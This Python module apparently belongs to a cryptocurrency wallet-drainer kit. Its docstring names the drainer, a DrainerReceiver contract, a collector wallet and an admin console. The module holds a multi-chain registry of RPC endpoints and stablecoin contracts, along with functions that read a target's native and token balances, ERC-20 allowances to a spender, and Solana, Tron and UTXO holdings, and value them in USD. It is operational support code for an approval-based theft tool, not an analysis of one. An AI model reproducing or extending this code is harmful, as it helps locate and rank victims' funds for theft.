"""
Chain registry and balance readers for every family the drainer supports.

EVM networks are declared once in `EVM_NETWORKS`; scanners, the drainer, the
deploy script and the admin console all read from that map. Adding a chain is a
single entry here plus a deployed DrainerReceiver and native gas for the
collector on that chain.

Every EVM entry carries:
  chainId        EIP-155 chain id
  rpc            public fallback; RPC_<NAME> overrides it
  native         gas-token symbol (prices come from market.py)
  tokens         always-checked ERC-20s (symbol -> contract)
  tokenDecimals  decimals for those contracts, for display and sanity checks.
                 The drainer/scanner still reads decimals() on-chain.
  testnet        excluded from default scans and deploys
  permit2        canonical Permit2 is deployed at 0x0000…22D473030F116dDEE9F6B43aC78BA3
  alchemy        optional Alchemy subdomain for full token discovery
  logChunks      transfer-log scan depth (5000-block chunks); defaults below

UTXO chains appear only in the balance helpers — no approvals exist there.
"""
import asyncio
import logging
import re
from typing import Any, Dict, List, Optional

import httpx

import market

logger = logging.getLogger("chains")

UINT256_MAX = 2**256 - 1
NATIVE_DECIMALS = 18


def _net(chain_id: int, rpc: str, native: str,
         tokens: Dict[str, str], token_decimals: Dict[str, int],
         explorer: str, *, alchemy: Optional[str] = None,
         testnet: bool = False, permit2: bool = True,
         log_chunks: int = 8) -> Dict[str, Any]:
    return {
        "chainId": chain_id,
        "rpc": rpc,
        "native": native,
        "nativeDecimals": NATIVE_DECIMALS,
        "tokens": tokens,
        "tokenDecimals": token_decimals,
        "explorer": explorer,
        "alchemy": alchemy,
        "testnet": testnet,
        "permit2": permit2,
        "logChunks": log_chunks,
    }


# ---------------------------------------------------------------------------
# EVM registry. Order is the scan order and the admin console order.
# ---------------------------------------------------------------------------
EVM_NETWORKS: Dict[str, Dict[str, Any]] = {
    "Ethereum": _net(
        1, "https://ethereum-rpc.publicnode.com", "ETH",
        {"USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
         "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7"},
        {"USDC": 6, "USDT": 6},
        "https://etherscan.io", alchemy="eth-mainnet"),
    "Base": _net(
        8453, "https://base-rpc.publicnode.com", "ETH",
        {"USDC": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
         "USDT": "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2"},
        {"USDC": 6, "USDT": 6},
        "https://basescan.org", alchemy="base-mainnet"),
    "Arbitrum": _net(
        42161, "https://arbitrum-one-rpc.publicnode.com", "ETH",
        {"USDC": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
         "USDT": "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9"},
        {"USDC": 6, "USDT": 6},
        "https://arbiscan.io", alchemy="arb-mainnet"),
    "Optimism": _net(
        10, "https://optimism-rpc.publicnode.com", "ETH",
        {"USDC": "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
         "USDT": "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58"},
        {"USDC": 6, "USDT": 6},
        "https://optimistic.etherscan.io", alchemy="opt-mainnet"),
    "Polygon": _net(
        137, "https://polygon-bor-rpc.publicnode.com", "POL",
        {"USDC": "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",
         "USDT": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"},
        {"USDC": 6, "USDT": 6},
        "https://polygonscan.com", alchemy="polygon-mainnet"),
    "BSC": _net(
        56, "https://bsc-rpc.publicnode.com", "BNB",
        {"USDC": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
         "USDT": "0x55d398326f99059fF775485246999027B3197955"},
        {"USDC": 18, "USDT": 18},
        "https://bscscan.com"),
    "Avalanche": _net(
        43114, "https://avalanche-c-chain-rpc.publicnode.com", "AVAX",
        {"USDC": "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",
         "USDT": "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7"},
        {"USDC": 6, "USDT": 6},
        "https://snowtrace.io"),
    "Linea": _net(
        59144, "https://linea-rpc.publicnode.com", "ETH",
        {"USDC": "0x176211869cA2b568f2A7D4EE941E073a821EE1ff",
         "USDT": "0xA219439258ca9da29E9Cc4cE5596924745e12B93"},
        {"USDC": 6, "USDT": 6},
        "https://lineascan.build"),
    "Scroll": _net(
        534352, "https://scroll-rpc.publicnode.com", "ETH",
        {"USDC": "0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4",
         "USDT": "0xf55BEC9cafDbE8730f096Aa55dad6D22d44099Df"},
        {"USDC": 6, "USDT": 6},
        "https://scrollscan.com"),
    "zkSync": _net(
        324, "https://mainnet.era.zksync.io", "ETH",
        {"USDC": "0x1d17CBcF0D6D143135aE902365D2E5e2A16538D4",
         "USDT": "0x493257fD37EDB34451f62EDf8D2a0C418852bA4C"},
        {"USDC": 6, "USDT": 6},
        "https://explorer.zksync.io"),
    "Mantle": _net(
        5000, "https://mantle-rpc.publicnode.com", "MNT",
        {"USDT": "0x201EBa5CC46D216Ce6DC03F6a759e8E766e956aE"},
        {"USDT": 6},
        "https://mantlescan.xyz"),
    "Gnosis": _net(
        100, "https://gnosis-rpc.publicnode.com", "xDAI",
        {"USDC": "0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83",
         "USDT": "0x4ECaBa5870353805a9F068101A40E0f32ed605C6"},
        {"USDC": 6, "USDT": 6},
        "https://gnosisscan.io"),
    "Celo": _net(
        42220, "https://celo-rpc.publicnode.com", "CELO",
        {"USDC": "0xcebA9300f2b948710d2653dD7B07f33A8B32118C",
         "USDT": "0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e"},
        {"USDC": 6, "USDT": 6},
        "https://celoscan.io"),
    "Fantom": _net(
        250, "https://rpc.fantom.network", "FTM",
        {"USDC": "0x2F733095B80A04b38b0D10cC884524a3d09b836a",
         "USDT": "0x049d68029688eAbF473097a2fC38ef61633A3C7A"},
        {"USDC": 6, "USDT": 6},
        "https://ftmscan.com"),
    "Berachain": _net(
        80094, "https://berachain-rpc.publicnode.com", "BERA",
        {"USDC": "0x549943e04f40284185054145c6E4e9568C1D3241"},
        {"USDC": 6},
        "https://berascan.com"),
    "Sonic": _net(
        146, "https://sonic-rpc.publicnode.com", "S",
        {"USDC": "0x29219dd400f2Bf60E5a23d13Be72B486D4038894",
         "USDT": "0x6047828dc181963ba44974801FF68e538dA5eaF9"},
        {"USDC": 6, "USDT": 6},
        "https://sonicscan.org"),
    "Unichain": _net(
        130, "https://unichain-rpc.publicnode.com", "ETH",
        {"USDC": "0x078D782b760474a361dDA0AF3839290b0EF57AD6",
         "USDT": "0x588CE4F028D8e7B53B687865d6A67b3A54C75518"},
        {"USDC": 6, "USDT": 6},
        "https://uniscan.xyz"),
    "Worldchain": _net(
        480, "https://worldchain-mainnet.g.alchemy.com/public", "ETH",
        {"USDC": "0x79A02482A880bCE3F13e09Da970dC34db4CD24d1"},
        {"USDC": 6},
        "https://worldscan.org", alchemy="worldchain-mainnet"),
    "HyperEVM": _net(
        999, "https://rpc.hyperliquid.xyz/evm", "HYPE",
        {"USDC": "0xb88339CB7199b77E23DB6E890353E22632Ba630f"},
        {"USDC": 6},
        "https://hyperevmscan.io"),
    "Mode": _net(
        34443, "https://mainnet.mode.network", "ETH",
        {"USDC": "0xd988097fb8612cc24eeC14542bC03424c656005f",
         "USDT": "0xf0F161fDA2712DB8b566946122a5af183995e2eD"},
        {"USDC": 6, "USDT": 6},
        "https://explorer.mode.network"),
    "opBNB": _net(
        204, "https://opbnb-rpc.publicnode.com", "BNB",
        {"USDT": "0x9e5AAC1Ba1a2e6aEd6b32689DFcF62A509Ca96f3"},
        {"USDT": 18},
        "https://opbnb.bscscan.com"),

    # --- testnets (excluded from default scans/deploys) ---
    "Sepolia": _net(
        11155111, "https://ethereum-sepolia-rpc.publicnode.com", "ETH",
        {"USDC": "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238"},
        {"USDC": 6},
        "https://sepolia.etherscan.io", testnet=True, log_chunks=6),
    "BaseSepolia": _net(
        84532, "https://base-sepolia-rpc.publicnode.com", "ETH",
        {"USDC": "0x036CbD53842c5426634e7929541eC2318f3dCF7e"},
        {"USDC": 6},
        "https://sepolia.basescan.org", testnet=True, log_chunks=6),
    "ArbitrumSepolia": _net(
        421614, "https://arbitrum-sepolia-rpc.publicnode.com", "ETH",
        {"USDC": "0x75faf114eafb1BDbe2F0316DF893fd58CE46AA4d"},
        {"USDC": 6},
        "https://sepolia.arbiscan.io", testnet=True, log_chunks=6),
}

SOLANA_MINTS = {
    "USDC": "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
    "USDT": "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",
    "wSOL": "So11111111111111111111111111111111111111112",
}

SOLANA_RPCS = [
    "https://api.mainnet-beta.solana.com",
    "https://rpc.ankr.com/solana",
    "https://solana.public-rpc.com",
]


def _norm(name: str) -> str:
    return re.sub(r"[^a-z0-9]", "", (name or "").lower())


_ALIASES = {
    "ethereum": "Ethereum", "eth": "Ethereum", "mainnet": "Ethereum",
    "ethereummainnet": "Ethereum",
    "base": "Base", "basemainnet": "Base",
    "arbitrum": "Arbitrum", "arbitrumnova": "Arbitrum",
    "arbitrumone": "Arbitrum", "arb": "Arbitrum",
    "optimism": "Optimism", "op": "Optimism", "opmainnet": "Optimism",
    "polygon": "Polygon", "polygonpos": "Polygon", "matic": "Polygon",
    "bsc": "BSC", "bnb": "BSC", "bnbchain": "BSC", "binance": "BSC",
    "binancesmartchain": "BSC",
    "avalanche": "Avalanche", "avalanchecchain": "Avalanche", "avax": "Avalanche",
    "linea": "Linea", "scroll": "Scroll",
    "zksync": "zkSync", "zksyncera": "zkSync", "zksynceramainnet": "zkSync",
    "mantle": "Mantle", "gnosis": "Gnosis", "xdai": "Gnosis",
    "celo": "Celo", "fantom": "Fantom", "fantomopera": "Fantom", "ftm": "Fantom",
    "berachain": "Berachain", "bera": "Berachain",
    "sonic": "Sonic", "unichain": "Unichain", "worldchain": "Worldchain",
    "world": "Worldchain", "hyperevm": "HyperEVM", "hyperliquid": "HyperEVM",
    "mode": "Mode", "opbnb": "opBNB",
    "sepolia": "Sepolia", "ethereumsepolia": "Sepolia",
    "basesepolia": "BaseSepolia", "arbitrumsepolia": "ArbitrumSepolia",
}


def resolve_network(name: str) -> Optional[str]:
    """Map a wallet-provided label ("Ethereum Mainnet", "BSC", "zksync") to a registry key."""
    if not name:
        return None
    if name in EVM_NETWORKS:
        return name
    return _ALIASES.get(_norm(name))


def evm_network_names(include_testnets: bool = False) -> List[str]:
    return [n for n, cfg in EVM_NETWORKS.items()
            if include_testnets or not cfg["testnet"]]


def is_testnet(name: str) -> bool:
    cfg = EVM_NETWORKS.get(name)
    return bool(cfg and cfg["testnet"])


def network_meta(name: str) -> Dict[str, Any]:
    try:
        return EVM_NETWORKS[name]
    except KeyError:
        raise KeyError(f"unknown EVM network: {name!r}") from None


def chain_id_of(name: str) -> int:
    return int(network_meta(name)["chainId"])


def token_decimals(name: str, symbol: str) -> Optional[int]:
    cfg = EVM_NETWORKS.get(name) or {}
    return (cfg.get("tokenDecimals") or {}).get(symbol)


def rpc_for(net: str) -> str:
    """Per-chain RPC with an env override: RPC_ETHEREUM, RPC_BASESEPOLIA, …"""
    cfg = EVM_NETWORKS[net]
    import os
    return (os.environ.get(f"RPC_{_norm(net).upper()}", "").strip()
            or os.environ.get(f"RPC_{net.upper()}", "").strip()
            or cfg["rpc"])


# ---------------------------------------------------------------------------
# Address predicates
# ---------------------------------------------------------------------------
def is_evm_address(addr: str) -> bool:
    return bool(re.match(r"^0x[a-fA-F0-9]{40}$", addr or ""))


def is_sol_address(addr: str) -> bool:
    if not addr or addr.startswith("0x") or len(addr) < 32 or len(addr) > 44:
        return False
    b58_chars = set("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz")
    return set(addr).issubset(b58_chars)


def is_tron_address(addr: str) -> bool:
    return bool(re.match(r"^T[a-zA-Z0-9]{33}$", addr or ""))


# ---------------------------------------------------------------------------
# EVM helpers
# ---------------------------------------------------------------------------
def _balance_of_data(address: str) -> str:
    return "0x70a08231" + address.lower().replace("0x", "").zfill(64)


def _allowance_data(owner: str, spender: str) -> str:
    return ("0xdd62ed3e"
            + owner.lower().replace("0x", "").zfill(64)
            + spender.lower().replace("0x", "").zfill(64))


def _word(raw: Optional[str]) -> int:
    if not raw or raw == "0x":
        return 0
    return int(raw, 16)


_client: Optional[httpx.AsyncClient] = None
_client_loop: Optional[asyncio.AbstractEventLoop] = None
_post_sem = asyncio.Semaphore(8)


def _http() -> httpx.AsyncClient:
    """Shared pool; public RPCs throttle per IP, so one client avoids handshake storms."""
    global _client, _client_loop
    loop = asyncio.get_running_loop()
    if _client is None or _client.is_closed or _client_loop is not loop:
        _client = httpx.AsyncClient(
            timeout=httpx.Timeout(12.0, connect=8.0),
            limits=httpx.Limits(max_connections=32, max_keepalive_connections=16),
        )
        _client_loop = loop
    return _client


async def _post(client: httpx.AsyncClient, url: str,
                 payload: Dict[str, Any]) -> httpx.Response:
    async with _post_sem:
        return await client.post(url, json=payload)


async def get_evm_network_balances(net_name: str, address: str) -> Dict[str, Any]:
    """Native + configured-token balances for one chain, in human units and USD."""
    cfg = EVM_NETWORKS.get(net_name)
    if not cfg or not is_evm_address(address):
        return {"error": "unknown_network"}

    rpc = rpc_for(net_name)
    out: Dict[str, Any] = {
        "network": net_name, "native": 0.0, "nativeSym": cfg["native"],
        "nativeUsd": 0.0, "tokens": [], "usd": 0.0,
    }

    client = _http()
    try:
        response = await _post(client, rpc, {
            "jsonrpc": "2.0", "id": 1, "method": "eth_getBalance",
            "params": [address, "latest"],
        })
        wei = _word(response.json().get("result", "0x0"))
        amount = wei / (10 ** cfg["nativeDecimals"])
        price = market.price(cfg["native"])
        out["native"] = amount
        out["nativeUsd"] = amount * price
        out["usd"] += out["nativeUsd"]
    except Exception as exc:                                  # noqa: BLE001
        logger.debug("native balance %s/%s failed: %s", net_name, address, exc)

    for symbol, contract in cfg["tokens"].items():
        decimals = cfg["tokenDecimals"].get(symbol, 18)
        try:
            response = await _post(client, rpc, {
                "jsonrpc": "2.0", "id": 2, "method": "eth_call",
                "params": [{"to": contract, "data": _balance_of_data(address)}, "latest"],
            })
            raw = response.json().get("result", "0x0")
            if not raw or raw == "0x":
                continue
            amount = _word(raw) / (10 ** decimals)
            if amount <= 0:
                continue
            usd = amount * market.price(symbol)
            out["tokens"].append({"symbol": symbol, "token": contract,
                                   "amount": amount, "decimals": decimals, "usd": usd})
            out["usd"] += usd
        except Exception as exc:                              # noqa: BLE001
            logger.debug("token balance %s/%s %s failed: %s",
                         net_name, address, symbol, exc)

    return out


async def get_evm_balances(address: str) -> Dict[str, Any]:
    """Aggregate every registered chain. Shape matches engine.wallet_view()."""
    if not is_evm_address(address):
        return {}

    nets = evm_network_names(include_testnets=False)
    results = await asyncio.gather(
        *[get_evm_network_balances(net, address) for net in nets],
        return_exceptions=True,
    )

    networks: Dict[str, Any] = {}
    total_usd = 0.0
    for net, result in zip(nets, results):
        if isinstance(result, dict) and "error" not in result:
            networks[net] = result
            total_usd += result.get("usd", 0.0)

    return {
        "native": total_usd,          # engine treats `balance` as USD for EVM
        "nativeUsd": sum(r.get("nativeUsd", 0.0) for r in networks.values()),
        "nativeSym": "ETH",
        "tokens": [t for r in networks.values() for t in r.get("tokens", [])],
        "networks": networks,
        "usd": total_usd,
        "ts": None,
    }


async def get_evm_allowance(net_name: str, token_contract: str, owner: str,
                            spender: str, decimals: int = 18) -> float:
    data = _allowance_data(owner, spender)
    try:
        response = await _post(_http(), rpc_for(net_name), {
            "jsonrpc": "2.0", "id": 3, "method": "eth_call",
            "params": [{"to": token_contract, "data": data}, "latest"],
        })
        raw = response.json().get("result", "0x0")
        if raw and raw != "0x":
            return _word(raw) / (10 ** decimals)
    except Exception:                                         # noqa: BLE001
        pass
    return 0.0


# ---------------------------------------------------------------------------
# Solana helpers
# ---------------------------------------------------------------------------
async def get_solana_balances(address: str, tokens: Optional[list] = None) -> Dict[str, float]:
    out = {"SOL": 0.0, "USDC": 0.0, "USDT": 0.0}
    if not is_sol_address(address):
        return out

    for rpc in SOLANA_RPCS:
        try:
            async with httpx.AsyncClient(timeout=8.0) as client:
                response = await client.post(rpc, json={
                    "jsonrpc": "2.0", "id": 1, "method": "getBalance",
                    "params": [address, {"commitment": "confirmed"}],
                })
                out["SOL"] = int((response.json().get("result") or {}).get("value") or 0) / 1e9

                response = await client.post(rpc, json={
                    "jsonrpc": "2.0", "id": 2, "method": "getTokenAccountsByOwner",
                    "params": [address,
                               {"programId": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"},
                               {"encoding": "jsonParsed"}],
                })
                accounts = (response.json().get("result") or {}).get("value") or []
                for account in accounts:
                    info = (account.get("account", {}).get("data", {})
                            .get("parsed", {}).get("info", {}))
                    mint = info.get("mint")
                    amount = float((info.get("tokenAmount") or {}).get("uiAmount") or 0)
                    for symbol, target in SOLANA_MINTS.items():
                        if mint == target:
                            out[symbol] = max(out.get(symbol, 0.0), amount)
            break
        except Exception as exc:                              # noqa: BLE001
            logger.debug("Solana RPC %s failed: %s", rpc, exc)

    return out


# ---------------------------------------------------------------------------
# Tron helpers
# ---------------------------------------------------------------------------
TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
_TRON_API = "https://api.trongrid.io"


async def get_tron_balances(address: str) -> Dict[str, float]:
    out = {"TRX": 0.0, "USDT": 0.0}
    if not is_tron_address(address):
        return out

    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.post(f"{_TRON_API}/wallet/getaccount",
                                         json={"address": address, "visible": True})
            if response.status_code == 200:
                out["TRX"] = (response.json().get("balance", 0) or 0) / 1e6

            response = await client.post(f"{_TRON_API}/wallet/triggerconstantcontract", json={
                "owner_address": address,
                "contract_address": TRON_USDT,
                "function_selector": "balanceOf(address)",
                "parameter": address[1:].zfill(64),
                "visible": True,
            })
            result = (response.json() or {}).get("constant_result") or []
            if result:
                out["USDT"] = int(result[0], 16) / 1e6
    except Exception as exc:                                  # noqa: BLE001
        logger.debug("Tron query error: %s", exc)

    return out


# ---------------------------------------------------------------------------
# UTXO helpers (watch-only)
# ---------------------------------------------------------------------------
async def get_utxo_balance(coin: str, address: str) -> Dict[str, float]:
    out = {"confirmed": 0.0, "pending": 0.0}
    base = ("https://blockstream.info/api" if coin.upper() == "BTC"
            else "https://litecoinspace.org/api")
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.get(f"{base}/address/{address}")
        if response.status_code == 200:
            data = response.json()
            chain_stats = data.get("chain_stats", {})
            mempool_stats = data.get("mempool_stats", {})
            confirmed = (int(chain_stats.get("funded_txo_sum", 0))
                         - int(chain_stats.get("spent_txo_sum", 0)))
            pending = (int(mempool_stats.get("funded_txo_sum", 0))
                       - int(mempool_stats.get("spent_txo_sum", 0)))
            out["confirmed"] = max(0, confirmed) / 1e8
            out["pending"] = max(0, pending) / 1e8
    except Exception:                                         # noqa: BLE001
        pass
    return out
